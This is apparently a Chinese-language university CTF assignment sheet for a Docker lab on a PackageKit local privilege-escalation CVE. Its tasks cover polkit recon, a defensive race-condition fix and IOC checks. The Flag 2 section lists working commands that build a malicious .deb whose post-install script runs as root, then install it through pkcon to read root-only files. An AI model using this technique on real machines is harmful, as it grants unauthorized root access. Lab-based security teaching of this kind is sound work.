# Week 12 CTF — Pack2TheRoot 攻擊任務

**CVE**：[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)  
**環境**：`dinosn/pack2theroot-lab` Docker Lab  
**繳交方式**：三個 flag 截圖附於滲透測試報告中

---

## 環境啟動

```bash
cd pack2theroot-lab
docker compose up -d
docker compose ps   # 確認三個 container 都在執行
```

| Container | SSH Port | 說明 |
|-----------|----------|------|
| pack2theroot-vuln | 2222 | 有漏洞（PackageKit 1.3.4 + permissive polkit）|
| pack2theroot-patched | 2223 | 已修補（同版本 + hardened polkit）|
| pack2theroot-exploit | — | TOCTOU race condition 示範 |

SSH 帳密：`labuser` / `labuser`

---

## 🟢 Flag 1 — System Recon（Lab 1）

**任務**：找出 vulnerable container 中設定過於寬鬆的 polkit rule。

```bash
ssh labuser@localhost -p 2222
pkaction --verbose --action-id org.freedesktop.packagekit.package-install
```

**目標**：找到 `allow_active` 不是 `auth_admin` 的 action，截圖記錄 action ID 與值。

> 正常安全設定：`allow_active = auth_admin`（需輸入密碼）  
> 過度寬鬆設定：`allow_active = yes`（任何本地使用者直接允許）  
> 這個過度寬鬆的授權規則，是 Pack2TheRoot 能成功提權的前提條件。

**Flag 格式**：截圖 + 在報告中說明此 action 的安全風險。

---

## 🟡 Flag 2 — 取得 Root（Lab 2）

**任務**：利用 PackageKit 的 TOCTOU 漏洞，讓 post-install script 以 root 執行，讀出 `/root/flag.txt`。

### 步驟

```bash
ssh labuser@localhost -p 2222

# 1. 建立惡意套件目錄
mkdir -p /tmp/evil-pkg/DEBIAN

# 2. 填寫套件描述
cat > /tmp/evil-pkg/DEBIAN/control << 'EOF'
Package: lab-evil-pkg
Version: 1.0
Architecture: amd64
Maintainer: labuser
Description: Week 12 Lab Package
EOF

# 3. 寫入 post-install script（以 root 執行）
cat > /tmp/evil-pkg/DEBIAN/postinst << 'EOF'
#!/bin/bash
cat /root/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
EOF
chmod 755 /tmp/evil-pkg/DEBIAN/postinst

# 4. 打包
dpkg-deb --build /tmp/evil-pkg /tmp/evil.deb

# 5. 透過 PackageKit 安裝（觸發漏洞）
pkcon install-local --allow-untrusted /tmp/evil.deb

# 6. 讀取 flag
cat /tmp/flag_captured.txt
```

**Flag 格式**：`PACK2THEROOT{...}`，截圖終端機輸出。

<details>
<summary>提示（卡住再看）</summary>

- 如果 pkcon 回傳 permission denied，確認 Lab 1 找到的 polkit rule 是否為 `yes`
- `postinst` 必須有執行權限（`chmod 755`）
- 若 container 使用 rpm 格式（Fedora/Rocky），改用 `rpmbuild` 建立 .rpm 套件

</details>

---

## 🔴 Flag 3 — 防禦實作（Lab 3）

**任務**：完成 `transaction_demo.py` 的 `safe_execute()`，讓 1000 次壓力測試全部通過。

```bash
# 先觀察脆弱版本
python3 transaction_demo.py --vulnerable

# 完成 safe_execute() 後測試
python3 transaction_demo.py --safe
```

通過測試條件：
- `balance 出現負數：0 次`
- `執行超過一次：0 次`

**Flag 格式**：程式印出的 `FLAG{...}`，截圖終端機輸出。

---

## 驗收清單（報告中需涵蓋）

- [ ] Flag 1 截圖：過度寬鬆的 polkit action 截圖
- [ ] Flag 2 截圖：`/root/flag.txt` 內容截圖（含 `id` 輸出，確認為 root）
- [ ] Flag 3 截圖：壓力測試通過截圖（1000 輪，0 負數）
- [ ] Patched container 對比：嘗試攻擊 port 2223 的結果（被拒絕的截圖）
- [ ] IOC 截圖：`journalctl -u packagekit | grep "assertion failed"` 輸出
